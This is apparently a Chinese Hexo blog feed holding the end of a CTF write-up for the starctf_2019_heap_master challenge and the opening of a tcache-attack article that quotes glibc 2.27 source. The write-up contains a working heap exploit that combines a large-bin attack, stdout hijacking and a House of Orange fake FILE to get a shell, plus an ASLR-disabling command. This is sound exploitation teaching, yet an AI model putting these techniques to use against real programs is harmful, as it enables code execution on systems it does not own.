class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">_IO_str_finish_ptr_addr = libc_base + <span class="number">0x3c34b0</span></span><br><span class="line">lg(<span class="string">&#x27;_IO_list_all_addr&#x27;</span>,_IO_list_all_addr)</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">lg(<span class="string">&#x27;binsh_addr&#x27;</span>,binsh_addr)</span><br><span class="line">lg(<span class="string">&#x27;_IO_str_finish_ptr_addr&#x27;</span>,_IO_str_finish_ptr_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#house of orange glibc2.24-2.27</span></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) <span class="comment">#unsorted bin attack</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr - <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(binsh_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line"><span class="comment">#vtable -&gt; _IO_strn_jumps - 0x8</span></span><br><span class="line">fake_file += p64(_IO_str_finish_ptr_addr - <span class="number">0x18</span>) <span class="comment">#vtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system_addr)   </span><br><span class="line">delete(<span class="number">0xCE0</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="built_in">len</span>(fake_file),fake_file) <span class="comment">#修改unsorted bin内容</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>打本地的时候<code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0</span><br><span class="line">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">$ <span class="built_in">cat</span> /flag</span><br><span class="line">[DEBUG] Sent 0xa bytes:</span><br><span class="line">    b<span class="string">&#x27;cat /flag\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x1a bytes:</span><br><span class="line">    b<span class="string">&#x27;flag&#123;this_is_a_test_flag&#125;\n&#x27;</span></span><br><span class="line">flag&#123;this_is_a_test_flag&#125;</span><br><span class="line">$</span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./starctf_2019_heap_master&#x27;</span> (pid 485)</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./starctf_2019_heap_master&#x27;</span> (pid 483)</span><br></pre></td></tr></table></figure>

<h4 id="exp拆分讲解"><a href="#exp拆分讲解" class="headerlink" title="exp拆分讲解"></a>exp拆分讲解</h4><h5 id="在heapbase布局堆内存"><a href="#在heapbase布局堆内存" class="headerlink" title="在heapbase布局堆内存"></a>在heapbase布局堆内存</h5><p>布局了0x421,0x431,0x91大小的堆内存，其他的0x21是用来隔离的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#伪造8个chunk</span></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0x420</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">edit(<span class="number">0x440</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0x880</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>) + <span class="string">b&#x27;c&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">edit(<span class="number">0xCB0</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">edit(<span class="number">0xD60</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#7</span></span><br><span class="line">edit(<span class="number">0xD80</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>

<h5 id="将第一个chunk放入largebin中"><a href="#将第一个chunk放入largebin中" class="headerlink" title="将第一个chunk放入largebin中"></a>将第一个chunk放入largebin中</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#释放0，进入unsortedbin中</span></span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#malloc_consolidate将0放入large bin</span></span><br><span class="line">add(<span class="number">0x430</span>)</span><br></pre></td></tr></table></figure>

<h5 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin_attack"></a>largebin_attack</h5><p>largebin_attack就要对large_chunk的bk和bk_nextsize进行修改，这道题目中我们可以不断的通过edit()对heap_base那块内存进行修改和利用 unsortedbin 机制留下libc地址，而我们知道在unsortedbin中只有一个chunk时，必定会在这个chunk的bk，fd上留下libc的地址，所以我们要对这个large_chunk进行修改使它经过多次free()的机制留下libc地址</p>
<p>接下来，为了在bk和bk_nextsize处留下libc指针，我们要继续伪造unsorted bin</p>
<blockquote>
<p>这里为什么留下libc的地址呢？</p>
<p>因为我们要劫持_IO_2_1_stdout_，它也是libc中的地址也在main_arena中，而且低3位是不会变化的，所以我们可以通过低字节覆盖，这样就只剩下一位需要爆破，概率1&#x2F;16</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在bk_nextsize处留下libc指针</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xF0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>) * <span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#把unsorted bin申请掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在bk留下libc指针</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xC1</span>))</span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0xB0</span>) <span class="comment">#把unsorted bin申请掉</span></span><br></pre></td></tr></table></figure>

<p>覆盖率写在chunk0的libc地址的低字节，使flags字段位于addr1-&gt;fd，错位覆盖的方法使_IO_write_base的最低一字节为<code>\x00</code>，而我们的堆地址偏移设置的正好为<code>~880</code>（满足了hijack stdout的两个条件），通过那一位的爆破（或者重复运行exp）使chunk0-&gt;bk指向stdout就可以实现hijack stdout</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改large bin的bk，指向stdout</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s - <span class="number">0x10</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#修改large bin的bk_nextsize，指向_IO_write_base</span></span><br><span class="line">edit(<span class="number">0x20</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s - <span class="number">0x7</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#在这里可以理解一下house of storm的任意地址写是堆glibc源码中哪个位置写</span></span><br><span class="line"><span class="comment">#恢复large bin的头size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="comment">#3放入unsorted bin，3属于未归位的large bin</span></span><br><span class="line">delete(<span class="number">0x890</span>)</span><br><span class="line"><span class="comment">#0x90的堆放入unsorted bin    </span></span><br><span class="line">delete(<span class="number">0xCE0</span>)</span><br><span class="line"><span class="comment">#遍历unsorted bin时发生large bin attack，攻击io_2_1_stdout</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>

<h5 id="地址计算"><a href="#地址计算" class="headerlink" title="地址计算"></a>地址计算</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">24</span>))</span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = uu64(data) - libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">_IO_list_all_addr = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">_IO_str_finish_ptr_addr = libc_base + <span class="number">0x3c34b0</span></span><br><span class="line">lg(<span class="string">&#x27;_IO_list_all_addr&#x27;</span>,_IO_list_all_addr)</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">lg(<span class="string">&#x27;binsh_addr&#x27;</span>,binsh_addr)</span><br><span class="line">lg(<span class="string">&#x27;_IO_str_finish_ptr_addr&#x27;</span>,_IO_str_finish_ptr_addr)</span><br></pre></td></tr></table></figure>

<h5 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h5><p>利用house_of_orange来get shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#house of orange glibc2.24-2.27</span></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) <span class="comment">#unsorted bin attack</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr - <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(binsh_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line"><span class="comment">#vtable -&gt; _IO_strn_jumps - 0x8</span></span><br><span class="line">fake_file += p64(_IO_str_finish_ptr_addr - <span class="number">0x18</span>) <span class="comment">#vtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system_addr)   </span><br><span class="line">delete(<span class="number">0xCE0</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="built_in">len</span>(fake_file),fake_file) <span class="comment">#修改unsorted bin内容</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/seaaseesa/article/details/106699487">ha1vk</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>_IO_FILE 源码解读</title>
    <url>/2025/04/02/IO_FILE/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="49bedeb8659940530fa8d6749167485d3f47a13531b59d1b5e49d664ff7a58ac">aa660c56d9a2d8389cfc1a02879f4fc7ffa208fe82d326b460cf8b1a66c062d6</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2025/03/21/hello-world/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="565033cfbad0e25dd85edd49a3af67852a1a453d8356448553781d12c92411de">4630436162ade97ba2718b7d0c4b3b63f97fe7f487088031e1ec7f30c37889e17af4f6297068ec459b8609dd5e773f884c55009995b4e2fa14cd0ad5eff0ada9f9fb8fb348a39322f64a27b4e67198e9d0918355853825b4a8b859e1b0997d0838db13d93eb663a75abf26151a4cd6693bc3399e41eef6d4a0d8ac518bee9c9ddee4d733ecfde4f1c7c01610b2139c3f919d321e3580e4ea4d25333a1eb6a757138158c91746eb650d2bd292b639e6c34cbf144f87d98390fac9f8662146f06c3a6438c2b9ee94e1d311e783b3870047c72629be8369de61aafcfd95d1a6b146908a00176e823191858046b0d3068b0efa543f002c4411ac17d84cfbc5419db7d33e0dec60d5febc26877845ea4a0c78edbec57ec484cb94f4a5981b779247299a083552613550cf2067f03e18806e1d8b7363322598e505c747f93d1e38576db45e8de5d1770b452a4fb1219a730e7968e9f6fbb48dd64088b4f6b768d41ae0fde1188c840a5b26f4bcf87fc459371861bccf009fd56466bfb6189998e9e6a70ba3621ca8bdf949e5cadcc118f51f12983682d54b3fadc89599f99b3bc97b0ac705b13416a1e530d1e06e17469a74ffce4af1c9c1c3a7fe2e7d43f0a4553f309b55a680d4ba0eff5e1480ff40e6cca6cf09c8d0ab9d3d27139e5f1fa8ce760b2b398ec79fa2325ce353708b5fd4928897ec368d0027fa2da6b5a0fd8e4e9b7529ca09bebcdd4ee3a67b8793bf535765eccd25777435299c4f7eaac3b37aa14cd4e771f0d59050e41a2121cab03ed0afccb01338cfaa270444513ab17731861d2e4818cce309b9ff34abf619216411da184092968ba15dba46fd74305d671fcc251530f5b9827fa2b99f113bdb279c693dd1704ca3a9977b3cf3a9ef9e6e9aea7a55f4fc6fc7431430f1e9e124491e51c5a917d50a11cab0f41057afdd9d73a5b69b54cc67bafaa65d40dd533efc909c87f1c18ae04764a239ce69c0e6b19cc5ed2e7a78ac3ef08cb10b1f5b175a7d09c35fb03134919f9a86758fdb28838be1fac5331cdfa5707833518ca071974ca46fbdbf334145555a36a006404440d8fca60195baebf5d921d9ae64c6ede24c1ac47d7b3df82c3ce65f2f997606186ef07a3f88a8a3c72c8e7356c6e5c164a313008c552320c7cc95166d8e5e707dd2c9dbffb129a9ff70ff8101f09fb70b81f2e64efb235bd7a1a44978559875515a83368f1936fdc556832492ae0671d7b67a6d1103441d906adf08a33a54f41e0e0a81c7b4eac704aaa6c35e18d6dc5e7c207f526d5892197d5ec7c4dc0edc9efb23891b524cebecd0ce984f13642004ae7f4f54a08732b3ecd632161bc17cb1fd597809352045d72809c36c4bbd110a7497cabcf294feeb4d11fa9232188bee2584a68dfd88207a7cd9a48503570676e50847d192a2a6e7a3e53b1288974ea16d0d80073c728e0d84755ce47c943e600c17df7a43d591f7b8468bbefe1285a930632e3cc5655a628782afed132fd2656813b3e22325b3a48436551b12b4bb838771f30eb825dcd8fc754fd10a17f9662286af92f4f8894097e941fe3dbb4831cdbc6b443b1824d50b470da2542da6d87fa03706ed8a14dae9ea9870c7981bf761c813f8db6283e5e4d6f83a5a745ead7855a07cee619cc695b70f3df8b4b82f85ae49a93e0a2e86cb14d6e0f39d7f7bf03c28c6ca9e5390facd1c25ec8a080b42009a9e8e7a2661422d70a39b106406ace53b39d9f03ff1dc17e689135109c611b983c2627adbe1cf664ccb70961af510424ea592895cada1f8c387464a798fa7bccbf6c1194aee98de463a3b9d2dd218e14e3ae7e5d0c5f245cc7346d6e77b8485834290c726ad9b51e466d596aa6f3eda026257f794e43169d555593a6a2edff432c8fee45925e7e160535894a5c8cd682d47da0d6c0d453b6aabb3506802282bee599e6b9b05b39711c44af4661449bc4a5f0a6210b62bf1d925fa4ddd6119bf701a01d5697aca71cada1e1589a0292809eefc99ecf7cdfb7fdf6c58755e4056d96a320cf900212ea371469d77092e46fc449dfa62c7e239cba7cc11a68b343416c661aacab9576053516ad64f6d814c2ccc5e0f884262177421fc187ad171106677e25362053b1dfaf3886dc8836429ab3c84fd6e513de9ae09c0fa33f26d020910e61cf24436a5449543f2cd87c83075d5b6196c0906d9803c75158f3f735c9d5e676bff754f1624524fb3bb6ff74c7bc4efa5232f511f6b0101311503ca3f1f1e2d8896d2bba030c5ce2bfbe55caa42dc943bd894d3b4cb477545f75789e0319ffe57729a98b855a9714508a955c8320a1f26393e1f113062535a766a0467a50c0c9d56bc170e68453c016a231eb5723e8470065d0671efc61360e68506bf08024106b9f7ab456d894dfaf5b0a9b20c29411fbb86373522ac2d8c249cbb43844704009da10719c877b42ea5b0f29a1c857a6010f87cf67a5b6c17e7a692e14343826fdfcba7224f82ad67ab76ee82d6e6c764b155358cfcf2b474558e5368b62028c52c55ea61eff706ae8509a86649d409e3a033fffe63429d8f088985c99c2c574c6c8a8ee48f56d84a1bfbbc48250191029b02c8391e05a23f339dd8727457b77b17b9762d6a4f22a369776bfd3f185a9edcdab5b76017d1488457094eed536638b8565385fcab698c2e89b3ebcf1c5aafd80a54f225949b54174b691c1039aa90305bc2538c92411df088b15d3429a841fbe37b3372015181f4a30a3c1bc6e85539c4bd5a692da38b9e05aa69a2640ca4191cf46eb460bc72f5e6a03d98c5e5703e1971e237f10feca4fd1d6720a6631929b4150e2a1f24df54dfc3b94d0321be2001ddf5b8a7bc71b76e677157fe63fdf0e273af4dca56b9e3aba86fd2f893d1dc0c3ac64663868c19d50e6213033a6b4fac6dfbed7e3a01223421aa246a83db479a938f691c533a975b92477ed639b3aa7ace2b93f6402c6d8fc63504e5f383e07929e10a7839d1a9d17330a2883e68592eaba9a66f7ecf4d7c9778380a9acd2dbbaac5f6ded1f384077269489201d58495f66e6c2e14d6939fd0b56382986631a1b9eaefadce7cf27a8999bb34f675b5806d3c4ee96604468043783c027fa96f06ef3ec165fde40bd102c8</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>Tcache attack</title>
    <url>/2025/03/26/tcache_attack/</url>
    <content><![CDATA[<p>文章是在初次学习tcache_attack时写的，有不准确的地方还望指正，文章中所用的环境基本都是ubuntu18.04</p>
<h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><p>cache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。</p>
<blockquote>
<p>主要参考了 glibc 2.27源码，</p>
</blockquote>
<h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><p>tcache 引入了两个新的结构体，<code>tcache_entry</code> 和 <code>tcache_perthread_struct</code>。</p>
<p>这其实和 fastbin 很像，但又不一样。</p>
<h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p><code>tcache_entry</code> 用于链接空闲的 chunk 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk。</p>
<p>需要注意的是这里的 next 指向 chunk 的 user data，而 fastbin 的 fd 指向 chunk 开头的地址。</p>
<p>而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p>
<h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>，它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项 tcache_entry，其中</p>
<ul>
<li><code>tcache_entry</code> 用<strong>单向链表</strong>的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</li>
<li><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，<strong>每条链上最多可以有 7 个 chunk</strong>。</li>
</ul>
<p>用图表示大概是：</p>
<p><img data-src="/../images/006AWYXBly1fw87zlnrhtj30nh0ciglz.jpg" alt="img"></p>
<h3 id="基本工作方式"><a href="#基本工作方式" class="headerlink" title="基本工作方式"></a>基本工作方式</h3><ul>
<li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</li>
<li>free 内存，且 size 小于 small bin size 时</li>
<li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 后：<ul>
<li>先放到对应的 tcache 中，直到 tcache 被填满（<strong>默认是 7 个</strong>）</li>
<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 中的 chunk 不会合并（<strong>不取消 inuse bit</strong>）</li>
</ul>
</li>
<li>malloc 内存，且 size 在 tcache 范围内</li>
<li>先从 tcache 取 chunk，直到 tcache 为空</li>
<li>tcache 为空后，从 bin 中找</li>
<li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk**，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中**，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
</ul>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol>
<li>tcache最多由64个bins链接而成，而每一个bins中最多放7个chunk</li>
<li>64位机中最小size是24字节,每16字节递增一次,而32位机上为12字节,每8字节递增一次</li>
<li>这也就意味着我们最大的chunk必须小于0x410,也就是我们申请的size要小于0x408(64位机上)</li>
</ol>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>接下来从2.27源码的角度分析一下 tcache。</p>
<h4 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h4><p>第一次 malloc 时，会进入到 <code>MAYBE_INIT_TCACHE ()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  <span class="comment">// 根据 malloc 传入的参数计算 chunk 实际大小，并计算 tcache 对应的下标</span></span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化 tcache</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins  <span class="comment">// 根据 size 得到的 idx 在合法的范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// tcache-&gt;entries[tc_idx] 有 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="tcache-init"><a href="#tcache-init" class="headerlink" title="__tcache_init()"></a>__tcache_init()</h4><p>其中 <code>MAYBE_INIT_TCACHE ()</code> 在 tcache 为空（即第一次 malloc）时调用了 <code>tcache_init()</code>，直接查看 <code>tcache_init()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tcache_init(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  arena_get (ar_ptr, bytes); <span class="comment">// 找到可用的 arena</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  